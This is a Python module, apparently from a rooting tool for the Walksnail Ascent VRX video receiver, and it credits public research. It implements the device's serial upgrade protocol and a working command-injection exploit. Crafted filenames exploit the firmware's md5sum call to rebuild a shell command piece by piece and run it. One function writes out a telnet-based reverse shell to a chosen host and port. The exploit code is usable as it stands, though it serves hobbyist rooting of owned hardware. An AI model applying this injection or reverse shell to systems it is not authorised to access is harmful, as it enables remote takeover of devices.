"""Ascent VRX serial protocol and command-injection engine.

The wire format, the ``GET_DEVICE_INFO`` handshake and the path-injection
technique come from the public Walksnail Ascent VRX rooting research by
umeow0716:

    https://github.com/umeow0716/Walksnail-Ascent-FPV-VRX-Rooting

This module is a cleaned-up, reusable version of that proof of concept.
It is intentionally UI-free: the interactive tool lives in ``root_tool.py``.
"""

from __future__ import annotations

import hashlib
import re
import struct
import sys
import time
import zlib
from collections.abc import Callable
from dataclasses import dataclass

try:  # pyserial is optional at import time so diagnostics can explain the fix
    import serial
    from serial.tools import list_ports

    HAS_PYSERIAL = True
except ImportError:  # pragma: no cover - depends on the environment
    serial = None  # type: ignore[assignment]
    list_ports = None  # type: ignore[assignment]
    HAS_PYSERIAL = False


# ============================================================
# Protocol constants
# ============================================================

MAGIC = b"OTRA"
PROTO_VERSION = 0x00010CDC
MAGIC2 = 0xABCD0000
RESPONSE_VERSIONS = frozenset({0x00010CDC, 0x00020CDC})
RESPONSE_MAGIC2 = frozenset({0xABCD0000, 0x00000000})
FORMAT = 2
HEADER_SIZE = 36
MAX_RESPONSE_PAYLOAD = 64 * 1024

DEFAULT_BAUDRATE = 115200
FILE_CHUNK_SIZE = 1024 * 1024

# pyserial 3.5 introduced the stable ``list_ports`` device metadata this tool
# relies on. Older releases import fine but fail later with obscure errors.
MIN_PYSERIAL_VERSION = (3, 5)

CMD_GET_DEVICE_INFO = 0x3C
CMD_RESET_SESSION = 0x72
CMD_FILE_INFO = 0x73
CMD_FILE_DATA = 0x74
CMD_FILE_DONE = 0x75
CMD_UPGRADE_STATUS = 0x76

DEVICE_INFO_SIZE = 300

DEFAULT_FILE_CONTENT = b"abc\n"
DEFAULT_LOCAL_NAME = "Ascent_G_Gnd_16_5_7.img"

# The firmware builds ``"md5sum %s"`` in a 64-byte snprintf buffer, so the
# injected path must keep the whole command below 64 bytes.
MAX_INJECT_PATH = 56
MAX_DATA_CHUNK = 5

# USB identifiers reported by the Ascent VRX composite gadget.
Ascent_VID = 0x1D77
Ascent_PID = 0xA4A2


# ============================================================
# Errors and data types
# ============================================================


class ProtocolError(RuntimeError):
    """Base class for protocol-level errors."""


class SerialTimeout(ProtocolError):
    """The VRX did not answer within the allotted time."""


class SerialDisconnected(ProtocolError):
    """The serial port disappeared while talking to the VRX."""


class DependencyError(ProtocolError):
    """A required Python package is missing."""


@dataclass(frozen=True)
class PortInfo:
    device: str
    description: str = ""
    hwid: str = ""
    manufacturer: str = ""
    vid: int | None = None
    pid: int | None = None
    serial_number: str | None = None

    @property
    def is_bluetooth(self) -> bool:
        text = f"{self.device} {self.description} {self.hwid}".lower()
        return "bth" in text or "bluetooth" in text

    @property
    def summary(self) -> str:
        parts = [self.description or "unknown device"]
        if self.vid is not None and self.pid is not None:
            parts.append(f"VID:PID={self.vid:04X}:{self.pid:04X}")
        elif self.hwid:
            parts.append(self.hwid)
        return "  ".join(p for p in parts if p)


@dataclass(frozen=True)
class DeviceInfo:
    receive_max_size: int
    sdk_version: str
    device_name: str
    cpu_temp: int
    firmware_info: str
    serial_number: str
    hardware_version: str
    status: int
    detail: str

    @property
    def looks_like_vrx(self) -> bool:
        text = f"{self.device_name} {self.firmware_info} {self.sdk_version}".lower()
        return any(word in text for word in ("ascent", "vrx", "caddx", "walksnail", "ar_"))


@dataclass(frozen=True)
class Response:
    command: int
    sequence: int
    payload: bytes
    status: int = 0
    detail: str = ""
    written: int = 0
    current_size: int = 0
    total_size: int = 0


@dataclass(frozen=True)
class InjectionStep:
    path: str
    label: str
    is_launcher: bool = False

    @property
    def kind(self) -> str:
        if self.is_launcher:
            return "launcher"
        if self.path.startswith("/tmp/;P="):
            return "slash"
        return "data"


# ============================================================
# Dependency and port helpers
# ============================================================


def reload_pyserial() -> bool:
    """Retry importing pyserial after a runtime install or upgrade.

    The old modules are dropped from ``sys.modules`` first; otherwise Python
    would hand back the already-imported (old) release after an upgrade.
    """
    global serial, list_ports, HAS_PYSERIAL

    for name in ("serial", "serial.tools", "serial.tools.list_ports"):
        sys.modules.pop(name, None)

    try:
        import serial as _serial
        from serial.tools import list_ports as _list_ports

        serial = _serial
        list_ports = _list_ports
        HAS_PYSERIAL = True
    except ImportError:
        serial = None  # type: ignore[assignment]
        list_ports = None  # type: ignore[assignment]
        HAS_PYSERIAL = False
    return HAS_PYSERIAL


def parse_pyserial_version(text: str | None) -> tuple[int, int] | None:
    """Return ``(major, minor)`` from a version string, or ``None``."""
    if not text:
        return None
    match = re.match(r"\s*v?(\d+)\.(\d+)", str(text))
    if not match:
        return None
    return int(match.group(1)), int(match.group(2))


def pyserial_version() -> str | None:
    """Return the installed pyserial version, if it can be determined."""
    if not HAS_PYSERIAL or serial is None:
        return None

    value = getattr(serial, "__version__", None)
    if value:
        return str(value)

    # Some distributions strip serial.__version__; ask the package metadata.
    try:
        from importlib.metadata import version as distribution_version

        return distribution_version("pyserial")
    except Exception:  # noqa: BLE001 - metadata lookup is best-effort
        return None


def pyserial_supported() -> bool | None:
    """Return whether pyserial is new enough, or ``None`` if unknown."""
    parsed = parse_pyserial_version(pyserial_version())
    if parsed is None:
        return None
    return parsed >= MIN_PYSERIAL_VERSION


def list_serial_ports() -> list[PortInfo]:
    if not HAS_PYSERIAL or list_ports is None:
        raise DependencyError("pyserial is not installed")

    ports: list[PortInfo] = []
    for port in list_ports.comports():
        ports.append(
            PortInfo(
                device=port.device,
                description=port.description or "",
                hwid=port.hwid or "",
                manufacturer=port.manufacturer or "",
                vid=getattr(port, "vid", None),
                pid=getattr(port, "pid", None),
                serial_number=getattr(port, "serial_number", None),
            )
        )
    return ports


def port_score(port: PortInfo) -> int:
    """Heuristic score: higher means "more likely to be the VRX"."""
    text = f"{port.description} {port.hwid} {port.manufacturer}".lower()
    score = 0

    if port.vid == Ascent_VID:
        score += 100
    if port.pid == Ascent_PID:
        score += 20
    if f"vid:pid={Ascent_VID:04x}" in text or f"vid_{Ascent_VID:04x}" in text:
        score += 60
    if any(word in text for word in ("ascent", "vrx", "caddx", "walksnail")):
        score += 60
    if "usb serial" in text or "usb-serial" in text or "usb serial device" in text:
        score += 25
    if "acm" in text:
        score += 10
    if "rndis" in text:
        score += 5
    if port.is_bluetooth:
        score -= 80
    return score


# ============================================================
# Packet encoding
# ============================================================


def build_packet(command: int, sequence: int, payload: bytes = b"", arg: int = 0) -> bytes:
    header_zero_crc = struct.pack(
        "<4sIIIIIIII",
        MAGIC,
        PROTO_VERSION,
        MAGIC2,
        command,
        FORMAT,
        len(payload),
        sequence,
        arg,
        0,
    )
    checksum = zlib.crc32(header_zero_crc + payload) & 0xFFFFFFFF
    header = struct.pack(
        "<4sIIIIIIII",
        MAGIC,
        PROTO_VERSION,
        MAGIC2,
        command,
        FORMAT,
        len(payload),
        sequence,
        arg,
        checksum,
    )
    return header + payload


def parse_header(header: bytes) -> dict:
    if len(header) != HEADER_SIZE:
        raise ProtocolError(f"bad header size: {len(header)}")
    magic, proto, magic2, command, fmt, payload_len, seq, arg, crc = struct.unpack(
        "<4sIIIIIIII", header
    )
    return {
        "magic": magic,
        "proto": proto,
        "magic2": magic2,
        "cmd": command,
        "format": fmt,
        "payload_len": payload_len,
        "seq": seq,
        "arg": arg,
        "crc": crc,
    }


def verify_crc(header: bytes, payload: bytes) -> bool:
    if len(header) != HEADER_SIZE:
        return False
    received = struct.unpack_from("<I", header, 32)[0]
    zeroed = bytearray(header)
    zeroed[32:36] = b"\x00\x00\x00\x00"
    return received == (zlib.crc32(bytes(zeroed) + payload) & 0xFFFFFFFF)


def _fixed_c_string(text: str, size: int) -> bytes:
    raw = text.encode("utf-8")
    if len(raw) >= size:
        raise ValueError(f"string too long for {size}-byte field: {text!r}")
    return raw + b"\x00" * (size - len(raw))


def _read_c_string(data: bytes, offset: int, size: int) -> str:
    field = data[offset : offset + size]
    end = field.find(b"\x00")
    if end >= 0:
        field = field[:end]
    return field.decode("utf-8", errors="replace")


def parse_device_info(payload: bytes) -> DeviceInfo:
    """Parse the 300-byte response to ``GET_DEVICE_INFO``."""
    if len(payload) < DEVICE_INFO_SIZE:
        raise ProtocolError(
            f"device information payload is {len(payload)} bytes, expected "
            f"{DEVICE_INFO_SIZE} - is this really a Caddx VRX?"
        )

    return DeviceInfo(
        receive_max_size=struct.unpack_from("<i", payload, 0)[0],
        sdk_version=_read_c_string(payload, 4, 32),
        device_name=_read_c_string(payload, 36, 64),
        cpu_temp=struct.unpack_from("<i", payload, 100)[0],
        firmware_info=_read_c_string(payload, 104, 64),
        serial_number=_read_c_string(payload, 168, 32),
        hardware_version=_read_c_string(payload, 200, 32),
        status=struct.unpack_from("<i", payload, 232)[0],
        detail=_read_c_string(payload, 236, 64),
    )


def build_file_info_payload(
    file_bytes: bytes,
    remote_path: str,
    local_name: str = DEFAULT_LOCAL_NAME,
    flag: int = 1,
) -> bytes:
    md5_text = hashlib.md5(file_bytes).hexdigest()
    payload = struct.pack(
        "<64sII128s128s",
        _fixed_c_string(md5_text, 64),
        len(file_bytes),
        flag,
        _fixed_c_string(remote_path, 128),
        _fixed_c_string(local_name[-127:], 128),
    )
    if len(payload) != 328:
        raise ProtocolError(f"bad metadata size: {len(payload)}")
    return payload


# ============================================================
# Serial link
# ============================================================


class AscentLink:
    """Request/response link to the VRX upgrade service."""

    def __init__(
        self,
        port: str,
        baudrate: int = DEFAULT_BAUDRATE,
        log: Callable[[str], None] | None = None,
    ) -> None:
        self.port = port
        self.baudrate = baudrate
        self.log = log or (lambda _message: None)
        self.sequence = 1
        self._ser = None

    # ------------------------------------------------------------- lifecycle

    def __enter__(self) -> AscentLink:  # noqa: PYI034 - Self requires Python 3.11
        self.open()
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        self.close()

    @property
    def is_open(self) -> bool:
        return self._ser is not None and bool(getattr(self._ser, "is_open", False))

    def open(self) -> None:
        if not HAS_PYSERIAL or serial is None:
            raise DependencyError("pyserial is not installed")

        try:
            self._ser = serial.Serial(
                self.port,
                baudrate=self.baudrate,
                bytesize=serial.EIGHTBITS,
                parity=serial.PARITY_NONE,
                stopbits=serial.STOPBITS_ONE,
                timeout=0.05,
                write_timeout=5,
            )
        except Exception as error:  # serial.SerialException, PermissionError, ...
            raise SerialDisconnected(f"cannot open {self.port}: {error}") from error

        self.reset_buffers()
        self.log(f"opened {self.port} at {self.baudrate} baud")

    def close(self) -> None:
        if self._ser is None:
            return
        try:
            self._ser.close()
        except Exception:  # noqa: BLE001, S110 - closing a dead port is best-effort
            pass
        self._ser = None

    def reset_buffers(self) -> None:
        if self._ser is None:
            return
        try:
            self._ser.reset_input_buffer()
            self._ser.reset_output_buffer()
        except Exception:  # noqa: BLE001, S110 - buffer flush is best-effort
            pass

    # ------------------------------------------------------------------- I/O

    def _read_exact(self, size: int, deadline: float) -> bytes:
        if self._ser is None:
            raise SerialDisconnected("serial port is not open")

        buffer = bytearray()
        while len(buffer) < size:
            if time.monotonic() > deadline:
                raise SerialTimeout(f"read timeout: need {size}, got {len(buffer)}")
            try:
                chunk = self._ser.read(size - len(buffer))
            except Exception as error:
                raise SerialDisconnected(f"serial read failed: {error}") from error
            if chunk:
                buffer.extend(chunk)
        return bytes(buffer)

    def _read_until_magic(self, deadline: float) -> None:
        if self._ser is None:
            raise SerialDisconnected("serial port is not open")

        window = bytearray()
        while True:
            if time.monotonic() > deadline:
                raise SerialTimeout("timeout waiting for OTRA magic")
            try:
                byte = self._ser.read(1)
            except Exception as error:
                raise SerialDisconnected(f"serial read failed: {error}") from error
            if not byte:
                continue
            window.extend(byte)
            if len(window) > len(MAGIC):
                del window[0]
            if bytes(window) == MAGIC:
                return

    def _read_response(
        self,
        expected_command: int,
        expected_sequence: int,
        timeout: float,
    ) -> Response:
        deadline = time.monotonic() + timeout

        while time.monotonic() < deadline:
            self._read_until_magic(deadline)
            header_bytes = MAGIC + self._read_exact(HEADER_SIZE - len(MAGIC), deadline)
            info = parse_header(header_bytes)

            if info["magic"] != MAGIC:
                continue
            if info["proto"] not in RESPONSE_VERSIONS:
                self.log(f"ignoring response with protocol 0x{info['proto']:08X}")
                continue
            if info["magic2"] not in RESPONSE_MAGIC2:
                self.log(f"ignoring response with magic2 0x{info['magic2']:08X}")
                continue
            if info["format"] != FORMAT:
                continue
            if info["payload_len"] > MAX_RESPONSE_PAYLOAD:
                continue

            payload = (
                self._read_exact(info["payload_len"], deadline) if info["payload_len"] else b""
            )
            if not verify_crc(header_bytes, payload):
                self.log(f"ignoring response with bad CRC (cmd=0x{info['cmd']:02X})")
                continue

            if info["cmd"] != expected_command or info["seq"] != expected_sequence:
                self.log(
                    "ignoring stale response: "
                    f"cmd=0x{info['cmd']:02X}, seq={info['seq']} "
                    f"(wanted cmd=0x{expected_command:02X}, seq={expected_sequence})"
                )
                continue

            return self._make_response(info, payload)

        raise SerialTimeout(
            f"timeout waiting for cmd=0x{expected_command:02X}, seq={expected_sequence}"
        )

    @staticmethod
    def _make_response(info: dict, payload: bytes) -> Response:
        command = info["cmd"]
        sequence = info["seq"]

        if command in (CMD_FILE_DATA, CMD_FILE_DONE):
            if len(payload) >= 16:
                written, current, total, code = struct.unpack_from("<IIII", payload, 0)
                detail = _read_c_string(payload, 16, max(0, len(payload) - 16))
            else:
                written = current = total = code = 0
                detail = ""
            return Response(
                command=command,
                sequence=sequence,
                payload=payload,
                status=code,
                detail=detail,
                written=written,
                current_size=current,
                total_size=total,
            )

        status = struct.unpack_from("<i", payload, 0)[0] if len(payload) >= 4 else 0
        detail = _read_c_string(payload, 4, max(0, len(payload) - 4))
        return Response(
            command=command,
            sequence=sequence,
            payload=payload,
            status=status,
            detail=detail,
        )

    # --------------------------------------------------------------- requests

    def send_request(
        self,
        command: int,
        payload: bytes = b"",
        *,
        arg: int = 0,
        expected: int | None = None,
        timeout: float = 8.0,
        retries: int = 0,
        require_ok: bool = True,
        accept_timeout: bool = False,
    ) -> Response | None:
        if self._ser is None:
            raise SerialDisconnected("serial port is not open")

        expected = command if expected is None else expected
        last_error: Exception | None = None

        for attempt in range(retries + 1):
            sequence = self.sequence
            self.sequence = (self.sequence + 1) & 0xFFFFFFFF
            packet = build_packet(command, sequence, payload, arg)

            self.log(
                f"send cmd=0x{command:02X} seq={sequence} arg={arg} "
                f"len={len(payload)} (attempt {attempt + 1}/{retries + 1})"
            )

            try:
                # The proven PoC sends the 36-byte header and the payload as
                # separate USB transfers, which the firmware parser expects.
                self._ser.write(packet[:HEADER_SIZE])
                self._ser.flush()
                if len(packet) > HEADER_SIZE:
                    time.sleep(0.001)
                    self._ser.write(packet[HEADER_SIZE:])
                self._ser.flush()
            except Exception as error:
                raise SerialDisconnected(f"serial write failed: {error}") from error

            try:
                response = self._read_response(expected, sequence, timeout)
            except SerialTimeout as error:
                last_error = error
                self.log(f"timeout: {error}")
                if attempt < retries:
                    continue
                if accept_timeout:
                    return None
                raise

            self.log(
                f"recv cmd=0x{response.command:02X} seq={response.sequence} "
                f"status={response.status} detail={response.detail!r}"
            )

            if (
                require_ok
                and command not in (CMD_FILE_DONE,)
                and (response.status != 0 or response.detail not in ("", "OK"))
            ):
                raise ProtocolError(
                    f"command 0x{command:02X} failed: "
                    f"status={response.status}, detail={response.detail!r}"
                )

            return response

        raise last_error or SerialTimeout("request failed")

    # --------------------------------------------------------------- helpers

    def get_device_info(self, timeout: float = 3.0, retries: int = 2) -> DeviceInfo:
        response = self.send_request(
            CMD_GET_DEVICE_INFO,
            timeout=timeout,
            retries=retries,
            require_ok=False,
        )
        if response is None:
            raise SerialTimeout("no response to device information request")
        return parse_device_info(response.payload)


# ============================================================
# Command injection
# ============================================================


SLASH_INJECT_TEMPLATE = "/tmp/;P=$(pwd|cut -c1); echo -n ${{P}} {redirect} ${{P}}tmp${{P}}e"
DATA_INJECT_TEMPLATE = "/tmp/;echo -n '{chunk}'{redirect}$(pwd|cut -c1)tmp$(pwd|cut -c1)e"
LAUNCHER_PATH = "/tmp/;cat $(pwd|cut -c1)tmp$(pwd|cut -c1)e | sh"


def validate_injected_command(command: str) -> None:
    if not command or not command.strip():
        raise ValueError("the injected command is empty")
    if "'" in command:
        raise ValueError(
            "the injected command contains a single quote, which cannot be "
            "written by the chunked echo method"
        )
    for forbidden, name in (("\n", "newline"), ("\r", "carriage return"), ("\x00", "NUL")):
        if forbidden in command:
            raise ValueError(f"the injected command contains a {name}")


def build_reverse_shell_command(host_ip: str, port: int) -> str:
    """Build a BusyBox-compatible reverse shell command.

    The device only ships ``/bin/sh`` and ``/bin/telnet`` (no netcat), so the
    shell is piped through a FIFO into ``telnet``.
    """
    return (
        "rm -f /tmp/f; mkfifo /tmp/f; "
        'cat /tmp/f | tr -d "\\r" | /bin/sh -i 2>&1 | '
        f"telnet {host_ip} {port} > /tmp/f"
    )


def build_injection_steps(command: str, chunk_size: int = MAX_DATA_CHUNK) -> list[InjectionStep]:
    """Split a shell command into firmware file paths that rebuild it in /tmp/e.

    Each path is both a filename written by command 0x73/0x74 and a shell
    fragment executed by the ``md5sum`` call in command 0x75.
    """
    validate_injected_command(command)
    if not 1 <= chunk_size <= MAX_DATA_CHUNK:
        raise ValueError(f"chunk_size must be between 1 and {MAX_DATA_CHUNK}")

    steps: list[InjectionStep] = []
    first_write = True
    index = 0

    while index < len(command):
        redirect = ">" if first_write else ">>"

        if command[index] == "/":
            path = SLASH_INJECT_TEMPLATE.format(redirect=redirect)
            steps.append(InjectionStep(path=path, label="/"))
            index += 1
        else:
            end = index
            while end < len(command) and end - index < chunk_size and command[end] != "/":
                end += 1
            chunk = command[index:end]
            path = DATA_INJECT_TEMPLATE.format(chunk=chunk, redirect=redirect)
            steps.append(InjectionStep(path=path, label=chunk))
            index = end

        first_write = False

    steps.append(InjectionStep(path=LAUNCHER_PATH, label="launch reverse shell", is_launcher=True))

    for step in steps:
        if len(step.path) > MAX_INJECT_PATH:
            raise ValueError(
                f"injection path is {len(step.path)} bytes, limit is {MAX_INJECT_PATH}: {step.path}"
            )

    return steps


def _write_step(
    link: AscentLink,
    remote_path: str,
    content: bytes,
    local_name: str,
    *,
    launcher: bool = False,
    exec_timeout: float = 0.8,
) -> None:
    # Reset the firmware's file-receive session.
    link.send_request(CMD_RESET_SESSION, arg=0, timeout=8.0, retries=1)
    link.send_request(CMD_RESET_SESSION, arg=1, timeout=8.0, retries=1)
    time.sleep(0.01)

    metadata = build_file_info_payload(content, remote_path, local_name)
    link.send_request(CMD_FILE_INFO, payload=metadata, timeout=8.0, retries=1)
    link.send_request(CMD_FILE_DATA, payload=content, timeout=8.0, retries=1)

    # 0x75 runs ``md5sum <path>``, which executes the injected shell fragment.
    # For the launcher the shell keeps running, so no response ever arrives.
    link.send_request(
        CMD_FILE_DONE,
        timeout=exec_timeout if launcher else 8.0,
        require_ok=False,
        accept_timeout=launcher,
    )


def write_injection_step(
    link: AscentLink,
    step: InjectionStep,
    *,
    content: bytes = DEFAULT_FILE_CONTENT,
    local_name: str = DEFAULT_LOCAL_NAME,
    exec_timeout: float = 0.8,
) -> None:
    """Write one payload fragment and trigger it with command 0x75."""
    _write_step(
        link,
        step.path,
        content,
        local_name,
        launcher=step.is_launcher,
        exec_timeout=exec_timeout,
    )


def inject_command(
    link: AscentLink,
    command: str,
    *,
    on_step: Callable[[int, int, InjectionStep], None] | None = None,
    content: bytes = DEFAULT_FILE_CONTENT,
    local_name: str = DEFAULT_LOCAL_NAME,
    step_delay: float = 0.1,
    exec_timeout: float = 0.8,
) -> list[InjectionStep]:
    """Write and execute the payload over an already-open link.

    One TCP connection to the host is expected shortly after this returns.
    """
    steps = build_injection_steps(command)
    total = len(steps)

    for number, step in enumerate(steps, start=1):
        if on_step is not None:
            on_step(number, total, step)
        write_injection_step(
            link,
            step,
            content=content,
            local_name=local_name,
            exec_timeout=exec_timeout,
        )
        if number < total:
            time.sleep(step_delay)

    return steps


def inject_command_reconnecting(
    port: str,
    command: str,
    *,
    baudrate: int = DEFAULT_BAUDRATE,
    on_step: Callable[[int, int, InjectionStep], None] | None = None,
    content: bytes = DEFAULT_FILE_CONTENT,
    local_name: str = DEFAULT_LOCAL_NAME,
    step_delay: float = 0.1,
    exec_timeout: float = 0.8,
    log: Callable[[str], None] | None = None,
) -> list[InjectionStep]:
    """Write the payload the way the reference PoC does.

    Each fragment gets a fresh serial connection, which resets the firmware's
    session and the packet sequence number exactly like the known-good
    ``stage_transfer_once`` flow.
    """
    steps = build_injection_steps(command)
    total = len(steps)

    for number, step in enumerate(steps, start=1):
        if on_step is not None:
            on_step(number, total, step)
        link = AscentLink(port, baudrate=baudrate, log=log)
        try:
            link.open()
            link.reset_buffers()
            write_injection_step(
                link,
                step,
                content=content,
                local_name=local_name,
                exec_timeout=exec_timeout,
            )
        finally:
            link.close()
        if number < total:
            time.sleep(step_delay)

    return steps


def run_launcher(
    link: AscentLink,
    *,
    content: bytes = DEFAULT_FILE_CONTENT,
    local_name: str = DEFAULT_LOCAL_NAME,
    exec_timeout: float = 0.8,
) -> None:
    """Re-run just the final payload step (useful after a dropped shell)."""
    _write_step(
        link,
        LAUNCHER_PATH,
        content,
        local_name,
        launcher=True,
        exec_timeout=exec_timeout,
    )


def injection_write_count(command: str) -> int:
    return len(build_injection_steps(command))
